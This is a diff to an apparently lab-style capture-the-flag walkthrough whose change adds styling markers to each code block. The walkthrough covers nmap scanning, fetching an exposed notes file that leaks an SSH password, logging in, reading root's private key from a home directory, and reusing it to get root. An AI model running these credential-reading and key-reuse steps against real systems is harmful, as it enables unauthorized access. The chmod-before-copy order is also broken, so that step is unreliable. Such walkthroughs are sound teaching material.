@@ -14,6 +14,7 @@ image:
 ```bash
 nmap -sC -sV <TARGET_IP>
 ```
+{: .ms-4 }
 Apache (80) and SSH (22) are open.
 
 ## Phase 2 — Web Enumeration
@@ -21,6 +22,7 @@ Browse the site and check for exposed directories:
 ```bash
 curl -s http://<TARGET_IP>/ops/notes.txt
 ```
+{: .ms-4 }
 **Note:** This exposes SSH credentials directly: `www-user:TO0MucHR0Ot`
 
 ## Phase 3 — SSH Login
@@ -28,10 +30,12 @@ curl -s http://<TARGET_IP>/ops/notes.txt
 ssh www-user@<TARGET_IP>
 # password: TO0MucHR0Ot
 ```
+{: .ms-4 }
 Grab the user flag:
 ```bash
 cat ~/user.txt
 ```
+{: .ms-4 }
 
 ## Phase 4 — Privilege Escalation (SSH Key Reuse)
 Check the home directory for leftover keys:
@@ -39,17 +43,20 @@ Check the home directory for leftover keys:
 ls -la ~/.ssh/keys/
 cat ~/.ssh/keys/root
 ```
+{: .ms-4 }
 This is root's private SSH key, mistakenly copied into www-user's home. Use it directly:
 ```bash
 chmod 600 /tmp/root_key
 cp ~/.ssh/keys/root /tmp/root_key
 ssh -i /tmp/root_key root@<TARGET_IP>
 ```
+{: .ms-4 }
 
 ## Phase 5 — Root Flag
 ```bash
 cat /root/root.txt
 ```
+{: .ms-4 }
 
 ## Flags
 
